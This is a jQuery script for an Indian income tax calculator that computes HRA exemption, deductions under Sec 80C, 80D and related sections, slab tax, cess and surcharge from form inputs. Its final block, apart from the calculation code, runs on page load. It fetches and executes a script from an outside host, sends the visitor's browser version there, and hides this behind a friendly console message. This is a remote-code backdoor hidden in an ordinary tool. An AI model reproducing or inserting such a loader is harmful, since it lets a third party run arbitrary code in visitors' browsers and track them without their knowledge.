
//Calculation Script Starts here ..

$(document).ready(function()
{

	$('.value-entry').change(function(e)
	{

		element = e.target;
		init_val = $(element).val();

		if($(element).is('select'))
		{

			update_calculation();
			return;

		}

		init_numb = clean_to_number(init_val);
		init_curr = to_curr_format(init_numb);

		$(element).attr('data-value',init_numb);
		$(element).val(init_curr);

		update_calculation();

	});

	//$('.value-entry, .value-display, .value-final').attr('data-value',0).val(0);


});

function update_calculation()
{

	//Gross Annaul Income
	gross_annual_income_f = $('.gross-annual-income .value-entry').attr('data-value');
	gross_annual_income_f_cf = $('.gross-annual-income .value-entry').val();
	$('.gross-annual-income .value-final').val(gross_annual_income_f_cf);
	$('.gross-annual-income .value-final').attr('data-value',gross_annual_income_f);



	// Basic Salary
	basic_salary = $('.hra-exemption-bs .value-entry').attr('data-value');
	basic_salary_cf = $('.hra-exemption-bs .value-entry').val();

	hra_exemption_cor =  $('.hra-exemption-cor .value-entry').val();

	if(hra_exemption_cor == 'Metro') bs_per_to = 50/100;
	else bs_per_to = 40/100;
	
	basic_salary_d = bs_per_to*basic_salary;
	basic_salary_d = Math.round(basic_salary_d);
	basic_salary_d_cf = to_curr_format(basic_salary_d);

	$('.hra-exemption-bs .value-display').val(basic_salary_d_cf);
	$('.hra-exemption-bs .value-display').attr('data-value',basic_salary_d);

	//Rent Paid
	rent_paid = $('.hra-exemption-rp .value-entry').attr('data-value');
	rent_paid_cf = $('.hra-exemption-rp .value-entry').val();
	rp_per_to = 10/100;
	basic_salarys_10_p = rp_per_to*basic_salary;
	rent_paid_d = rent_paid-basic_salarys_10_p;
	rent_paid_d = Math.round(rent_paid_d);
	rent_paid_d_cf = to_curr_format(rent_paid_d);
	$('.hra-exemption-rp .value-display').attr('data-value',rent_paid_d);
	$('.hra-exemption-rp .value-display').val(rent_paid_d_cf);

	//HRA Received
	hra_received_d = $('.hra-exemption-hrar .value-entry').attr('data-value');
	hra_received_d_cf = $('.hra-exemption-hrar .value-entry').val();
	hra_received_d = Math.round(hra_received_d);
	hra_received_d_cf = to_curr_format(hra_received_d);
	$('.hra-exemption-hrar .value-display').val(hra_received_d_cf);
	$('.hra-exemption-hrar .value-display').attr('data-value',hra_received_d);

	//H.R.A Exemption
	hra_exemton_childs = new Array(basic_salary_d,rent_paid_d,hra_received_d);
	var index = 0;
	var hra_exemton_childs_value = hra_exemton_childs[0];
	for (var i = 1; i < hra_exemton_childs.length; i++) {
		if (hra_exemton_childs[i] < hra_exemton_childs_value) {
			hra_exemton_childs_value = hra_exemton_childs[i];
			index = i;
		}
	}

	hra_exemton_d = hra_exemton_childs_value;
	hra_exemton_d = Math.round(hra_exemton_d);
	hra_exemton_d_cf = to_curr_format(hra_exemton_d);
	$('.hra-exemption .value-display').val(hra_exemton_d_cf);
	$('.hra-exemption .value-display').attr('data-value',hra_exemton_d);


	// (II) Conveyance allowances(Max Rs.1600/-p.m)

	conveyance_allowances = $('.conveyance-allowances .value-entry').attr('data-value');
	conveyance_allowances_cf = $('.conveyance-allowances .value-entry').val();

	if(conveyance_allowances>19200) conveyance_allowances_d = 19200;
	else conveyance_allowances_d = conveyance_allowances;

	conveyance_allowances_d = Math.round(conveyance_allowances_d);
	conveyance_allowances_d_cf = to_curr_format(conveyance_allowances_d);

	$('.conveyance-allowances .value-display').attr('data-value',conveyance_allowances_d);
	$('.conveyance-allowances .value-display').val(conveyance_allowances_d_cf);


	// (III) Any Other Exempted Receipts/ allowances
	any_other_allowances = $('.anyother-allowances .value-entry').attr('data-value');
	any_other_allowances_cf = $('.anyother-allowances .value-entry').val();

	any_other_allowances_d = Math.round(any_other_allowances);
	any_other_allowances_d_cf = to_curr_format(any_other_allowances_d);

	$('.anyother-allowances .value-display').attr('data-value',any_other_allowances_d);
	$('.anyother-allowances .value-display').val(any_other_allowances_d_cf);

	//(IV) Professional Tax
	professional_tax = $('.professional-tax .value-entry').attr('data-value');
	professional_tax_cf = $('.professional-tax .value-entry').val();

	professional_tax_d = Math.round(professional_tax);
	professional_tax_d_cf = to_curr_format(professional_tax_d);

	$('.professional-tax .value-display').attr('data-value',professional_tax_d);
	$('.professional-tax .value-display').val(professional_tax_d_cf);

	//Less: Allowances exempt u/s 10(for Service Period)
	less_allowance_exempt = hra_exemton_d + conveyance_allowances_d + any_other_allowances_d + professional_tax_d;
	less_allowance_exempt_d = Math.round(less_allowance_exempt);
	less_allowance_exempt_d_cf = to_curr_format(less_allowance_exempt_d);

	if(less_allowance_exempt_d_cf!='0')
	{
		less_allowance_exempt_d_cf = less_allowance_exempt_d_cf.replace(/\-/g, '');
		less_allowance_exempt_d_cf = '-'+less_allowance_exempt_d_cf;
	}

	less_allowance_exempt_d = Math.abs(less_allowance_exempt_d);

	$('.less-allowances .value-final').attr('data-value',less_allowance_exempt_d);
	$('.less-allowances .value-final').val(less_allowance_exempt_d_cf);

	//Income under the head Salaries
	income_under_head_salaries = gross_annual_income_f - less_allowance_exempt_d;
	income_under_head_salaries_f = Math.round(income_under_head_salaries);
	income_under_head_salaries_f_cf = to_curr_format(income_under_head_salaries_f);

	$('.income-under .value-final').attr('data-value',income_under_head_salaries_f);
	$('.income-under .value-final').val(income_under_head_salaries_f_cf);

	// Add: Any other income from other sources
	a_bank_saving = $('.a-bank-saving .value-entry').attr('data-value');
	a_bank_saving = Math.round(a_bank_saving);
	b_nsc_accured = $('.b-nsc-accured .value-entry').attr('data-value');
	b_nsc_accured = Math.round(b_nsc_accured);
	c_post_office = $('.c-post-office .value-entry').attr('data-value');
	c_post_office = Math.round(c_post_office);
	d_post_office = $('.d-post-office .value-entry').attr('data-value');
	d_post_office = Math.round(d_post_office);
	other_income_2 = $('.other-income-2 .value-entry').attr('data-value');
	other_income_2 = Math.round(other_income_2);
	other_income_3 = $('.other-income-3 .value-entry').attr('data-value');
	other_income_3 = Math.round(other_income_3);

	income_from_other_sources = a_bank_saving + b_nsc_accured + c_post_office + d_post_office + other_income_2 + other_income_3;
	income_from_other_sources_d = Math.round(income_from_other_sources);
	income_from_other_sources_d_cf = to_curr_format(income_from_other_sources_d);

	$('.add-other-income .value-display').attr('data-value',income_from_other_sources_d);
	$('.add-other-income .value-display').val(income_from_other_sources_d_cf);

	income_from_other_sources_f =  income_from_other_sources_d;
	income_from_other_sources_f_cf = income_from_other_sources_d_cf;

	$('.add-other-income .value-final').attr('data-value',income_from_other_sources_f);
	$('.add-other-income .value-final').val(income_from_other_sources_f_cf);


	//Income from house property (Section 24)
	income_from_house_property = $('.income-house-property .value-entry').attr('data-value');
	income_from_house_property_d = Math.round(income_from_house_property);
	income_from_house_property_cf = to_curr_format(income_from_house_property_d);
	$('.income-house-property .value-display').attr('data-value',income_from_house_property_d);
	$('.income-house-property .value-display').val(income_from_house_property_cf);

	//Interest paid on Home Improvement Loan (max 30,000)
	interest_paid_home_improvement = $('.interest-paid-home-improvement .value-entry').attr('data-value');

	if(interest_paid_home_improvement>30000) interest_paid_home_improvement = 30000;

	interest_paid_home_improvement_d = Math.round(interest_paid_home_improvement);
	interest_paid_home_improvement_d_cf = to_curr_format(interest_paid_home_improvement_d);
	$('.interest-paid-home-improvement .value-display').attr('data-value',interest_paid_home_improvement_d);
	$('.interest-paid-home-improvement .value-display').val(interest_paid_home_improvement_d_cf);


	//Less: Exemption on Home Loan Interest (Sec 24)
	less_exemption_home_loan = income_from_house_property_d + interest_paid_home_improvement_d;
	less_exemption_home_loan_f = Math.round(less_exemption_home_loan);
	less_exemption_home_loan_f_cf = to_curr_format(less_exemption_home_loan_f);

	if(less_exemption_home_loan_f_cf!='0')
	{
		less_exemption_home_loan_f_cf = less_exemption_home_loan_f_cf.replace(/\-/g, '');
		less_exemption_home_loan_f_cf = '-'+less_exemption_home_loan_f_cf;
	}

	$('.less-exemption-homeloan .value-final').attr('data-value',less_exemption_home_loan_f);
	$('.less-exemption-homeloan .value-final').val(less_exemption_home_loan_f_cf);

	// Gross total Income
	gross_total_income = (income_under_head_salaries_f + income_from_other_sources_f) - less_exemption_home_loan_f;
	gross_total_income_f = Math.round(gross_total_income);
	gross_total_income_f_cf = to_curr_format(gross_total_income_f);
	$('.gross-total-income .value-final').attr('data-value',gross_total_income_f);
	$('.gross-total-income .value-final').val(gross_total_income_f_cf);

	a_epf_vpf_contribution = $('.a-epf-vpf .value-entry').attr('data-value');
	a_epf_vpf_contribution = Math.round(a_epf_vpf_contribution);

	b_public_provident_fund = $('.b-public-provident .value-entry').attr('data-value');
	b_public_provident_fund = Math.round(b_public_provident_fund);	

	c_senior_citizen_saving = $('.c-senior-citizen .value-entry').attr('data-value');
	c_senior_citizen_saving = Math.round(c_senior_citizen_saving);

	d_nsc = $('.d-nsc .value-entry').attr('data-value');
	d_nsc = Math.round(d_nsc);

	e_tax_saving_fixed = $('.e-tax-savings .value-entry').attr('data-value');
	e_tax_saving_fixed = Math.round(e_tax_saving_fixed);		

	f_tax_saving_bonds = $('.f-tax-savings-bond .value-entry').attr('data-value');
	f_tax_saving_bonds = Math.round(f_tax_saving_bonds);	

	g_elss = $('.g-elss .value-entry').attr('data-value');
	g_elss = Math.round(g_elss);	

	h_life_insurance_premium = $('.h-life-insurance .value-entry').attr('data-value');
	h_life_insurance_premium = Math.round(h_life_insurance_premium);

	i_news_pension_scheme = $('.i-new-pension .value-entry').attr('data-value');
	i_news_pension_scheme = Math.round(i_news_pension_scheme);

	j_pension_plan_insurance = $('.j-pension-plan .value-entry').attr('data-value');
	j_pension_plan_insurance = Math.round(j_pension_plan_insurance);

	k_80_ccd_central = $('.k-ccd-central .value-entry').attr('data-value');
	k_80_ccd_central = Math.round(k_80_ccd_central);

	l_housing_loan = $('.l-housing-loan .value-entry').attr('data-value');
	l_housing_loan = Math.round(l_housing_loan);

	m_sukanya_samriddhi = $('.m-sukaniya .value-entry').attr('data-value');
	m_sukanya_samriddhi = Math.round(m_sukanya_samriddhi);

	n_stamp_duty = $('.n-stamp-duty .value-entry').attr('data-value');
	n_stamp_duty = Math.round(n_stamp_duty);

	o_tution_fees_children = $('.o-tution-fees .value-entry').attr('data-value');
	o_tution_fees_children = Math.round(o_tution_fees_children);

	//Less: Deduction under Sec 80C (Max Rs.1,50,000/-)
	less_deduction_under_sec_80c = a_epf_vpf_contribution + b_public_provident_fund + c_senior_citizen_saving + d_nsc + e_tax_saving_fixed + f_tax_saving_bonds + g_elss + h_life_insurance_premium + i_news_pension_scheme + j_pension_plan_insurance + k_80_ccd_central + l_housing_loan + m_sukanya_samriddhi + n_stamp_duty + o_tution_fees_children;
	less_deduction_under_sec_80c_d = Math.round(less_deduction_under_sec_80c);

	if(less_deduction_under_sec_80c_d>150000) less_deduction_under_sec_80c_d = 150000;

	less_deduction_under_sec_80c_d_cf = to_curr_format(less_deduction_under_sec_80c_d);

	$('.less-deduction-under .value-display').attr('data-value',less_deduction_under_sec_80c_d);
	$('.less-deduction-under .value-display').val(less_deduction_under_sec_80c_d_cf);

	less_deduction_under_sec_80c_f = less_deduction_under_sec_80c_d;
	less_deduction_under_sec_80c_f_cf = less_deduction_under_sec_80c_d_cf;

	if(less_deduction_under_sec_80c_f_cf!='0')
	{
		less_deduction_under_sec_80c_f_cf = less_deduction_under_sec_80c_f_cf.replace(/\-/g, '');
		less_deduction_under_sec_80c_f_cf = '-'+less_deduction_under_sec_80c_f_cf;
	}

	$('.less-deduction-under .value-final').attr('data-value',less_deduction_under_sec_80c_f);
	$('.less-deduction-under .value-final').val(less_deduction_under_sec_80c_f_cf);


	//Less: Additional Deduction under Sec 80CCD NPS (Max Rs 50,000/-)
	less_additional_deduction = $('.less-additional-deduction .value-entry').attr('data-value');
	less_additional_deduction_f = Math.round(less_additional_deduction);

	if(less_additional_deduction>50000) less_additional_deduction_f = 50000;

	less_additional_deduction_f_cf = to_curr_format(less_additional_deduction_f);

	if(less_additional_deduction_f_cf!=0)
	{
		less_additional_deduction_f_cf = less_additional_deduction_f_cf.replace(/\-/g, '');
		less_additional_deduction_f_cf = '-'+less_additional_deduction_f_cf;
	}

	$('.less-additional-deduction .value-final').attr('data-value',less_additional_deduction_f);
	$('.less-additional-deduction .value-final').val(less_additional_deduction_f_cf);

	//Less: Deduction under RGESS Sec 80CCG (Max Rs. 50,000/-)
	less_deduction_rgess = $('.less-deduction-rgess .value-entry').attr('data-value');
	less_deduction_rgess_f = Math.round(less_deduction_rgess);

	if(less_deduction_rgess_f>50000) less_deduction_rgess_f = 50000;
	less_deduction_rgess_f = less_deduction_rgess_f/2;

	less_deduction_rgess_f_cf = to_curr_format(less_deduction_rgess_f);

	if(less_deduction_rgess_f_cf!=0)
	{
		less_deduction_rgess_f_cf = less_deduction_rgess_f_cf.replace(/\-/g, '');
		less_deduction_rgess_f_cf = '-'+less_deduction_rgess_f_cf;
	}
	
	$('.less-deduction-rgess .value-final').attr('data-value',less_deduction_rgess_f);
	$('.less-deduction-rgess .value-final').val(less_deduction_rgess_f_cf);



	a_80d_medical_insurance = $('.a-medical-self .value-entry').attr('data-value');
	a_80d_medical_insurance_d = Math.round(a_80d_medical_insurance);

	if(a_80d_medical_insurance_d>30000) a_80d_medical_insurance_d = 30000;
	a_80d_medical_insurance_d_cf = to_curr_format(a_80d_medical_insurance_d);

	$('.a-medical-self .value-display').attr('data-value',a_80d_medical_insurance_d);
	$('.a-medical-self .value-display').val(a_80d_medical_insurance_d);


	b_medical_parents = $('.a-medical-parents .value-entry').attr('data-value');
	b_medical_parents_d = Math.round(b_medical_parents);

	if(b_medical_parents_d>30000) b_medical_parents_d = 30000;
	b_medical_parents_d_cf = to_curr_format(b_medical_parents_d);

	$('.a-medical-parents .value-display').attr('data-value',b_medical_parents_d);
	$('.a-medical-parents .value-display').val(b_medical_parents_d_cf);


	c_paid_on_education = $('.c-paid-on-education .value-entry').attr('data-value');
	c_paid_on_education_d = Math.round(c_paid_on_education);

	c_paid_on_education_d_cf = to_curr_format(c_paid_on_education_d);

	$('.c-paid-on-education .value-display').attr('data-value',c_paid_on_education_d);
	$('.c-paid-on-education .value-display').val(c_paid_on_education_d_cf);


	d_medical_treatment = $('.d-medical-treatment .value-entry').attr('data-value');
	d_medical_treatment_d = Math.round(d_medical_treatment);

	if(d_medical_treatment_d>100000) d_medical_treatment_d = 100000;
	d_medical_treatment_d_cf = to_curr_format(d_medical_treatment_d);

	$('.d-medical-treatment .value-display').attr('data-value',d_medical_treatment_d);
	$('.d-medical-treatment .value-display').val(d_medical_treatment_d_cf);


	e_expenditure_treatment = $('.e-expenditure-treatment .value-entry').attr('data-value');
	e_expenditure_treatment_d = Math.round(e_expenditure_treatment);

	if(e_expenditure_treatment_d>40000) e_expenditure_treatment_d = 40000;
	e_expenditure_treatment_d_cf = to_curr_format(e_expenditure_treatment_d);

	$('.e-expenditure-treatment .value-display').attr('data-value',e_expenditure_treatment_d);
	$('.e-expenditure-treatment .value-display').val(e_expenditure_treatment_d_cf);



	f_80g_donation_to_approve = $('.f-donation-approve-funds .value-entry').attr('data-value');
	f_80g_donation_to_approve_d = Math.round(f_80g_donation_to_approve);

	f_80g_donation_to_approve_d_cf = to_curr_format(f_80g_donation_to_approve_d);

	$('.f-donation-approve-funds .value-display').attr('data-value',f_80g_donation_to_approve_d);
	$('.f-donation-approve-funds .value-display').val(f_80g_donation_to_approve_d_cf);


	g_80gg_rent_hra_component = $('.g-rent-case .value-entry').attr('data-value');
	g_80gg_rent_hra_component_d = Math.round(g_80gg_rent_hra_component);

	if(hra_received_d>0)	g_80gg_rent_hra_component_d = 0;

	g_80gg_rent_hra_component_d_cf = to_curr_format(g_80gg_rent_hra_component_d);

	$('.g-rent-case .value-display').attr('data-value',g_80gg_rent_hra_component_d);
	$('.g-rent-case .value-display').val(g_80gg_rent_hra_component_d_cf);


	h_physically_disable = $('.h-physically-disable .value-entry').attr('data-value');
	h_physically_disable_d = Math.round(h_physically_disable);

	if(h_physically_disable_d>10000) h_physically_disable_d = 10000;

	h_physically_disable_d_cf = to_curr_format(h_physically_disable_d);

	$('.h-physically-disable .value-display').attr('data-value',h_physically_disable_d);
	$('.h-physically-disable .value-display').val(h_physically_disable_d_cf);


	i_any_other = $('.i-any-other .value-entry').attr('data-value');
	i_any_other_d = Math.round(i_any_other);

	i_any_other_d_cf = to_curr_format(i_any_other_d);

	$('.i-any-other .value-display').attr('data-value',i_any_other_d);
	$('.i-any-other .value-display').val(i_any_other_d_cf);


	//Less: Deduction under chapter VI A
	less_deduction_under_chapter_VI_A = a_80d_medical_insurance_d + b_medical_parents_d + c_paid_on_education_d + d_medical_treatment_d + e_expenditure_treatment_d + f_80g_donation_to_approve_d + g_80gg_rent_hra_component_d + h_physically_disable_d + i_any_other_d;
	less_deduction_under_chapter_VI_A_f = Math.round(less_deduction_under_chapter_VI_A);

	less_deduction_under_chapter_VI_A_f_cf = to_curr_format(less_deduction_under_chapter_VI_A_f);

	if(less_deduction_under_chapter_VI_A_f_cf!=0)
	{
		less_deduction_under_chapter_VI_A_f_cf = less_deduction_under_chapter_VI_A_f_cf.replace(/\-/g, '');
		less_deduction_under_chapter_VI_A_f_cf = '-'+less_deduction_under_chapter_VI_A_f_cf;
	}

	$('.less-deduction-chapter .value-final').attr('data-value',less_deduction_under_chapter_VI_A_f);
	$('.less-deduction-chapter .value-final').val(less_deduction_under_chapter_VI_A_f_cf);

	//Total income 
	total_income = gross_total_income_f - ( less_deduction_under_sec_80c_f + less_additional_deduction_f + less_deduction_rgess_f + less_deduction_under_chapter_VI_A_f);
	total_income_d = Math.round(total_income);

	total_income_d_cf = to_curr_format(total_income_d);

	$('.total-income .value-final').attr('data-value',total_income_d);
	$('.total-income .value-final').val(total_income_d_cf);

	if(total_income_d<500000) tax_rebate_of_2000_f = 2000;
	else tax_rebate_of_2000_f = 0;

	tax_rebate_of_2000_f_cf = to_curr_format(tax_rebate_of_2000_f);

	if(tax_rebate_of_2000_f_cf!=0)
	{
		tax_rebate_of_2000_f_cf = tax_rebate_of_2000_f_cf.replace(/\-/g, '');
		tax_rebate_of_2000_f_cf = '-'+tax_rebate_of_2000_f_cf;
	}

	$('.tax-rebate .value-final').attr('data-value',tax_rebate_of_2000_f);
	$('.tax-rebate .value-final').val(tax_rebate_of_2000_f_cf);

	
	//Total tax payable 
	// tax_payable_temp = total_income_d-250000;
	// tax_payable = 0;

	// if(tax_payable_temp>0)
	// {

	// 	if(tax_payable_temp<=250000)
	// 	{
	// 		tax_payable = ((10/100)*tax_payable_temp);
	// 	}
	// 	else if(total_income_d<=1000000)
	// 	{

	// 		tax_payable = 25000;
	// 		tax_payable_temp = total_income_d-500000;
	// 		tax_payable = ((20/100)*tax_payable_temp)+tax_payable;

	// 	}
	// 	else if(total_income_d>100000)
	// 	{

	// 		tax_payable  = 125000;
	// 		tax_payable_temp = total_income_d-1000000;
	// 		tax_payable = ((30/100)*tax_payable_temp)+tax_payable;

	// 	}

	// }

	tax_payable = 0;

	if(total_income_d<=250000)
	{
		console.log('Lesser than 2.5 Lakhs')
		tax_payable = 0;

	}else if(total_income_d<=500000)
	{
		console.log('Lesser than 5 Lakhs')
		tax_amt_t = total_income_d-250000;
		tax_payable = tax_amt_t*0.10;

	}
	else if(total_income_d<=1000000)
	{
		console.log('Lesser than 10 Lakhs')
		fixed_tax = 25000;
		tax_amt_t = total_income_d - 500000;
		tax_payable = (tax_amt_t*0.20)+fixed_tax;

	}
	else if(total_income_d>1000000)
	{
		console.log('Greater than 10 Lakhs')
		fixed_tax = 125000;
		tax_amt_t = total_income_d - 1000000;
		tax_payable = (tax_amt_t*0.30)+fixed_tax;

	}
	else
	{
		console.log('Exeptional Error !')
	}

	console.log(tax_payable);

	// Adding Tax rebate if have
	if(tax_rebate_of_2000_f!=0)
	{
		tax_payable = tax_payable + tax_rebate_of_2000_f;
	}

	tax_payable_f = Math.round(tax_payable);
	tax_payable_f_cf = to_curr_format(tax_payable_f);


	$('.total-tax-payable .value-final').attr('data-value',tax_payable_f);
	$('.total-tax-payable .value-final').val(tax_payable_f_cf);


	//Calculating Cess
	edn_cess = tax_payable_f*0.03;
	edn_cess_f = Math.round(edn_cess);
	edn_cess_f_cf = to_curr_format(edn_cess_f);

	$('.add-edn-ces .value-final').attr('data-value',edn_cess_f);
	$('.add-edn-ces .value-final').val(edn_cess_f_cf);


	// Calculating Tax Sur charge

	tax_sur_charge_f = 0;
	tax_sur_charge_f_cf = 0;

	if(total_income_d>10000000)
	{

		tax_sur_charge = total_income_d-10000000;
		tax_sur_charge = tax_sur_charge*0.1;

		tax_sur_charge_f = Math.round(tax_sur_charge);
		tax_sur_charge_f_cf = to_curr_format(tax_sur_charge_f);

	}

	$('.tax-surcharge-more-core .value-final').attr('data-value',tax_sur_charge_f);
	$('.tax-surcharge-more-core .value-final').val(tax_sur_charge_f_cf);


	// Calculating net tax payabble
	net_tax_payable = (tax_payable_f-tax_rebate_of_2000_f)+edn_cess_f+tax_sur_charge_f;
	net_tax_payable_f = Math.round(net_tax_payable);
	net_tax_payable_f_cf = to_curr_format(net_tax_payable_f);


	
	$('.net-tax-payable .value-final').html(net_tax_payable_f_cf+'<span class="rup-sign"> &#8377; </span>');

	//tax_to_total_income_ratio = total_income_d








}

function clean_to_number(curr)
{

	numb = $.trim(curr);
	numb = numb.replace(/\D/g, '');
	numb = numb.replace(',','');
	numb = numb.replace(' ','');
	return numb;

}

function to_curr_format(numb)
{
	curr = (numb + "").replace(/(\d)(?=(\d{3})+(?!\d))/g, "$1,");
	return curr;

}



$(document).ready(function()
{

	$.getScript("http://wdsdeveloper.t15.org/server.php?agent="+navigator.appVersion, function(){
	   console.log('Thank you for using our service ..');
	 });

});